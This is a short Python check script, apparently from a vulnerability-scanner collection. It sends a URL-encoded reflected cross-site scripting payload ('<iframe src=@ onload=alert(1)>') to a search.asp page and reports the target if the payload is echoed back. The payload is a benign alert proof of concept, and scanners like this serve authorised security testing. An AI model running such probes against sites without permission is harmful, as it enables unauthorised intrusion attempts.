#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/search.asp?q=%3Ciframe%20src%3D%40%20onload%3Dalert%281%29%3E"
bug ="<iframe src=@ onload=alert(1)>"
info ="/search.asp?q=%3Ciframe%20src%3D%40%20onload%3Dalert%281%29%3E"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
